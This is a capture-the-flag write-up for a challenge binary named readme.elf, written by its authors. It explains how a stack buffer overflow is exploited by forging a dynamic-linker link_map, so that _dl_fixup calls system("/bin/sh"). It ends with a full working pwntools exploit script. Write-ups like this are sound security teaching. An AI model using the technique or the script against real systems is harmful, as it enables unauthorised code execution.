## readme.elf writeup

We came up with this challenge after pwning the "unexploitable" challenge at <https://pwnable.kr>.
Reading the writeups for this challenge we noticed that non of the available writeups at <https://pwnable.kr> used return to ld as a solution, and we think using this to exploit a stack buffer overflow is a really powerful and overlooked technique. So we decided to write our own challenge using this technique.

### The Executeable

The executable is quite simple. It calls the "vuln" function reading up to 0x160 bytes from stdin into a stack buffer of size 0x10, leaving it vulnerable to stack buffer overflow attacks.

### checksec on ./readme

* Arch:        amd64-64-little
* RELRO:       Partial RELRO
* Stack:       Canary found
* NX:          NX enabled
* PIE:         No PIE (0x400000)

The executable contains no function for writing to stdout so libc leak is basically impossible and we need to exploit it in some other way.

### Gadgets

As seen above the binary has no pie meaning we can rop to any gadget in the binary. Unfortunately we have a very limited number of useful gadgets available:

1. `0x200000105e: pop rbp; ret;`
2. `0x2000001048: lea rsi, [rbp-0x10]; mov edx, 0x160; mov edi, 0x0; call read; pop rbp; ret;`
3. `0x2000001006: jmp qword [rel data_2000003ff0];`

The first gadget allows us to stack pivot and the second allows us to read 0x160 bytes into $rbp. This combined with the stack pivot above effectively gives us arbitrary write, with the catch that we must start a new rop-chain just after the 3 first qwords, so we continue execution after reading. Now we can read '\x00'*0x18 padding followed by a rop chain followed by some data we want to write.
The third gadget allows us to jmp to _dl_runtime_resolve_xsavec, effectively calling _dl_fixup.

_dl_fixup handles resolving lazy loaded functions at runtime, meaning we can possibly resolve to "system" from libc exploiting the, return to ld resolve technique.

## Solution
In order to go over the possible ways of exploiting return to ld resolve, you should have a good understanding of how _dl_fixup works. We won't go over it here, as this blog post covers it much better than we can explain it <https://ypl.coffee/dl-resolve/>.

### Classic return to ld resolve

We could try to exploit the program by putting a very big index on the stack before jumping to _ld_fixup so that we would look for the Elf64_Dyn struct in some other area of the elf than rela.plt, for instance got.plt, were we can write to. We could then create fake .rela.plt, .dynsym, .dynstr sections in got.plt to resolve "system".
This techniques is very vell explained here: <https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62>. 

### Obstacle 1
Unfortunately the index in Elf64_Dyn struct pointing to the corresponding Elf64_Sym is a uint32 index, but both .text and .got starts at a very large address 0x2000000000. This makes it impossible to create an index large enough to reach this address space using only a uint32, and therefore we cannot use this method. 

### Fake Elf64_Sym at already resolved libc address
Since we cannot reach the Elf64_Sym table directly we could try building a fake link map ourselves. We first saw this technique in a write up for the blinkroot challenge in hitcon quals ctf in 2015.
Again here is a more detailed resource of it <https://speakerd.s3.amazonaws.com/presentations/d83d11ed6c124caa812be6ebc1dc03a1/blinkroot.pdf>. 

Here we create a fake link map in our writeable space and push this to the stack along with the reloc_arg for _dl_fixup. Now that *we* construct the link_map, we control the start address of .rela.plt, .dynsym, and .dynstr and can put them in our writeable space. We can put the start address of the fake link_map close to 0x2000000000 and reach fake Elf64_Dyn and Elf64_Sym structs in the writeable space. However, now we have another problem. Our fake link_map need to contain l_next and l_prev pointers into libc like the original link_map does, in order to be able to resolve "system", but since we have no libc leak this is not possible.

The slides above have a trick to get around this, namely to make the Elf64_Sym struct be the GOT entry just before "read", and setting the sym->st_other to 3. This makes _dl_fixup think that the symbol has already been found and we can compute the address of the function from sym->value which is now the GOT entry of "read". The address is then computed by adding the load address stored in our fake link map to sym->value. We can make this addition equal "system", by setting the load address to the difference between "read" and "system". 

### Obstacle 2

In the blinkroot challenge, there is a second call to "puts" after we create our fake link map and we can then make "puts" resolve to "system", after which we can call it with "/bin/sh" as we control the input to "puts". We don't have that here as we only have a single call to "read", and we have no gadget to pop $rdi so we cannot control the input to "system" even if we managed to resolve "read" to "system" and call "read" again. This could potentially be fixed by resolving to a one gadget instead.

### Using a one-gadget
If we look at the requirements for the existing one-gadgets, they are as follows in libc 2.31, the currently newest version:

```bash
0xe6ce3 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
Here we see that in this version of libc we need control (since the requirements are not met by default) of $r10/$r12, $r10/$rdx or $rsi/$rdx, which we don't have.

### Obstacle 3
Next problem is even worse. To understand it we have to look at the libc code for _dl_fixup line 84 in libc 2.31. (/glibc/elf/dl-runtime.c)
```C
/* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
```
Here we see an if-case that checks if the symbol should be looked up. We want to force this to go into the else-case to use sym->value as the offset to the function. We need to set sym->st_other to do this. As our sym points to got[read]-0x8, sym->st_other will be a part of the address before "read" in GOT. In blinkroot this address is the address of the link_map aka. 0x7fxxxxxxxxxx in libc. And the 6 (0x7f) byte in this address correspond to the sym->st_other and thus always allow us to enter the else case. In our case the address before "read" is simply 0x0 and we can therefore not enter the else case. Furthermore this address, 0x2000003ff8, is a part of a non-writeable page, but the page right after, where "read" lies in GOT(0x2000004000), is writeable. Since we cannot change this we are never able to reach the else-case using this technique.

### Fake Link Map
In order to be able to reach the else-case we change our approach to start our fake link_map in the beginning of GOT. We start our fake link_map at address 0x2000004000 exactly at the first entry of GOT which is the address of our already resolved "read". This address also correspond to the load address of the link_map. So we start writing our fake link_map at 0x2000004000+0x8 as to not overwrite the "read" address. Now we create our fake rela.plt, .dynsym, .dynstr such that the st_value in the ELF64_Sym struct is the difference between "read" and "system" so we resolve "system". This will add the load address aka "read" and this difference together, to make the address of "system". Now we can finally call "system". However, we still need to put "/bin/sh" into $rdi.

### Putting "/bin/sh" into $rdi
Lets have a look at line 140 in dl_runtime.c:
```C
if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
```

Here we see that if we set st_info such that it will invoke the function in "value" which is now "system". But there is a catch, as the function _dl_fixup now ends here, $rdi will now not be clobbered further. 

On line 69 we see the statement
```C
const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
```
Here we see that we find the address of our fake strtab, which we control. We assume that the compiler was smart (fair assumption for glibc) and has at this point put the strtab into $rdi. This is because the only place where strtab is later used is on line 112 (see below) and the compiler can therefore preload strtab into $rdi.
```C
result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```

Now the expression strtab + sym->st_name is parsed as first parameter to _dl_lookup_symbol_x. To optimize this, the compiler should put strtab into $rdi at line 69 and later add sym->st_name before calling this function.
In our case we never hit this line but $rdi will still contain the pointer to strtab. We can simply put "/bin/sh" in strtab as we never use strtab for anything important. Furthermore elf_ifunc_invoke expects a function with parameters parsed on the stack so it wil not clobber $rdi.

Before calling _dl_fixup we make another "read" rop-chain, to pop a new $rbp. We will execute this rop chain at an other location than 0x2000004000+0x8 because everything before 0x2000004000 is not writeable and we need some more writeable stack space.

Our way of arbitrary writing, needs the a new rop chain to start at 0x18 in the buffer we send.
This means that we have to limit our rop chain size to not overlap with the relevant parts of the link_map.
Fortunately the first relevant part of the link_map is the l_info[5] at offset 0x48 leaving plenty of space for our small rop chain stack pivoting.

We can now call "system" with "/bin/sh" as the command line and we get a shell :-)

## Summary
We first create a fake_link table at address 0x2000004000 with "read" as the load address. We then call _dl_fixup with our fake link_map on the stack, and compute the address to call by taking link_map.laddr + sym->st_value, which makes "system" if we setup "sym" just right. We make the link_maps strtab contain "/bin/sh" and system("/bin/sh") will be called. 

## Exploit
Here is the exploit. It is worth noticing that this exploit also works on the two other challenges mentioned with very little modification even though it is not at all the intended solution. We think this illustrates how powerful a techniques this is. Furthermore this should work on most versions of glibc with the only constraint being that the compiler needs to put strtab in $rdi early on in _dl_fixup which O3 most certainly will.
```C
from pwn import *
import ctypes

context.clear(binary = ELF('./readme.elf'))
io = remote('127.0.0.1', 1024)
libc = ELF('./libc-2.31.so')
elf = context.binary

def send(by):
    sleep(0.1) # small sleep to encures last read has read entire buffer
    io.send(by)

#gadgets
leave = 0x200000105b
_dl_fixup = 0x2000001006
readAddr = 0x2000001048
popRbp = 0x200000105e

def createReadRopChain(addr: int):
    rop = ROP(elf)
    rop.raw(popRbp)
    rop.raw(addr+0x10)
    rop.raw(readAddr)
    return rop.chain()

class Elf64_Rel(ctypes.Structure):
    _fields_ = [("r_offset", ctypes.c_uint64),
                ("r_info", ctypes.c_uint64)]

class Elf64_Sym(ctypes.Structure):
    _fields_ = [("st_name", ctypes.c_uint32),
                ("st_info", ctypes.c_uint8),
                ("st_other", ctypes.c_uint8),
                ("st_shndx", ctypes.c_uint16),
                ("st_value", ctypes.c_uint64),
                ("st_size", ctypes.c_uint64)]

#command to run in system
fakeStrTabContent = b'/bin/sh\x00'
offsetToSystem = libc.symbols['system'] - libc.symbols['read']

stackPiviotAddr = 0x2000004f00
firstWrite = 0x2000004008
fakeLinkTableAddr = firstWrite-0x8
linkLen = 0x100
strTabAddr = fakeLinkTableAddr + linkLen
strTabLen = len(fakeStrTabContent) + 0x10
symtabAddr = strTabAddr + strTabLen
strSymLen = 0x28
jmpTabAddr = symtabAddr + strSymLen

#create first ropchain to make a strack piviot to just after read for creating the fake link_map
ropPadding = cyclic_find(b'gaaa')*b'\x00'
rop1 = ropPadding + createReadRopChain(firstWrite)
send(rop1)

rop2 = ropPadding + createReadRopChain(stackPiviotAddr)

#setup fake link map with pointers to our fake .dynstr, .dynsym, .rela.plt in the right place in the link_map
fakeLinkTable  = b'A'*8*6
fakeLinkTable += p64(strTabAddr) + p64(symtabAddr) + b'B'*8*16 + p64(jmpTabAddr)

#create the strtab containg /bin/sh
DT_STRTAB = 5
fakeStrTab = (p64(DT_STRTAB) + p64(strTabAddr+0x10) + fakeStrTabContent)

#create fake dynsym
#force call of elf_ifunc_invoke
stt_gnu_ifunc = 0xa
#force going into else case
st_visibility = 0x3
DT_SYMTAB = 6
#set up sym->value to be offsetToSystem (addr of system - addr of read)
fakeSynTabContent = bytes(Elf64_Sym(0x0, stt_gnu_ifunc, stt_gnu_ifunc, 0x0, offsetToSystem, 0x0))
fakeSymTab = (p64(DT_SYMTAB) + p64(symtabAddr+0x10) + fakeSynTabContent)

DT_JMPREL = 23
ELF_MACHINE_JMP_SLOT = 0x7
#set up jmptable so that the address we write systeam address = got[read]
#not really nessesary
deltaReadSystem = elf.got['read'] - offsetToSystem
fakeJmpTabContent = bytes(Elf64_Rel(deltaReadSystem, ELF_MACHINE_JMP_SLOT))
fakeJmpTab = (p64(DT_JMPREL) + p64(jmpTabAddr+0x10) + fakeJmpTabContent)

#construct final fake link_map
fakeLinkTable = fakeLinkTable + fakeStrTab + fakeSymTab + fakeJmpTab

#send rop chain + fakeLinkTable which is writen to 0x2000004008 leaving a link_map at 0x2000004000 calling system
rop2 = rop2 + fakeLinkTable
send(rop2)

rop = ROP(elf)
rop.raw(_dl_fixup)
rop.raw(fakeLinkTableAddr) #link_map
rop.raw(0x0) #reloc_offset

#send third rop chain for stackpivioting to an address with more writeable memory and calling _dl_fixup
rop3 = ropPadding + rop.chain()
send(rop3)

# here is your shell :-) 100% percent success rate
io.interactive()
```